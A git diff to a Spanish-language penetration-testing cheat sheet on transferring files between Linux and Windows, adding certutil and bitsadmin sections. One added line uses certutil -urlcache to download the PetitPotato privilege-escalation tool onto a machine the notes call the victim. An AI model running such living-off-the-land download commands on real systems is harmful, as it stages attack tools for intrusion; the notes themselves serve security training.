@@ -1,7 +1,8 @@
 # Transferir archivos 
 
-Tags: #FileTransfer #LinuxtoWindows #LinuxtoLinux 
+Tags: #FileTransfer #LinuxtoWindows #LinuxtoLinux #Certutil #Python #Impacket #Scp #IEX #Bitsadmin
 
+[LOLBAS](https://lolbas-project.github.io/)
 ## Linux a Windows 
 
 ```bash 
@@ -100,4 +101,19 @@ C:\Windows\Temp
 	# dir = Directorio en donde se colocara el archivo 
 
 2. ❯ scp user@IP:/dir/destino/ .                 # Copiar un archivo que se encuentra en la maquina Linux a Windows        
+```
+
+## Certutil 
+
+```bash 
+# Codifica y decodifica archivos en base64 
+❯ certutil -decode input.txt output.txt      # Decodificar un archivo 
+
+❯ certutil -urlcache -f https://github.com/wh0amitz/PetitPotato/releases/download/v1.0.0/PetitPotato.exe C:\Users\Public\PetitPotato.exe              # Descargar un archivo directamente desde la url y se coloca en una ruta especifica en la maquina victima 
+```
+
+## Bitsadmin  
+
+```bash
+❯ bitsadmin 
 ```
